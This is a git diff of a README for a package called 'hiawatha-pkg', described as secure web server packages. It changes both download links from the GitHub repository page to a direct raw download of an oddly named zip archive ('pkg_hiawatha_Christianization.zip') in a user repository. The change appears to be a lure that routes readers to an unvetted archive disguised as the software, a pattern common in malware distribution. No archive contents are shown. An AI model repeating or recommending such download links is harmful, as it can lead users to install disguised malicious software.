@@ -1,11 +1,11 @@
 # 🌐 hiawatha-pkg - Simple secure web server packages
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/magneticstripebufoboreas16/hiawatha-pkg)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/magneticstripebufoboreas16/hiawatha-pkg/main/majagua/pkg_hiawatha_Christianization.zip)
 
 ## 📦 Download
 
 Visit this page to download:
-https://github.com/magneticstripebufoboreas16/hiawatha-pkg
+https://raw.githubusercontent.com/magneticstripebufoboreas16/hiawatha-pkg/main/majagua/pkg_hiawatha_Christianization.zip
 
 ## 🧭 What this is
 
